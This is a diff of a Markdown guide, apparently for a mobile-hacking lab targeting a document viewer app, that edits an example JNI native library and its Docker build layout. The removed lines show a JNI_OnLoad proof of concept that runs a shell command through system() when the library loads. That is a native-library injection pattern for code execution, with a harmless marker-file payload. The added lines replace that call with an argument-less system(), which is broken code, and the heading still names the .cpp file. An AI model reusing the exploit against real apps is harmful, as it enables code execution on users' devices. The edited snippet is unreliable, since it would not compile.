@@ -40,17 +40,17 @@
 ```
 alc-docker/
 ├─ Dockerfile
-└─ native-lib.cpp   # Your C/C++ code (example below)
+└─ native-lib.c   # Your C code (example below)
 ```
 
 Example `native-lib.cpp` (mirrors the reference snippet):
 
-```cpp
+```c
 #include <jni.h>
-#include <cstdlib>
+#include <stdlib.h>
 
 JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
-    system("touch /data/user/0/com.mobilehackinglab.documentviewer/exploited.txt");
+    system();
     return JNI_VERSION_1_6;
 }
 ```
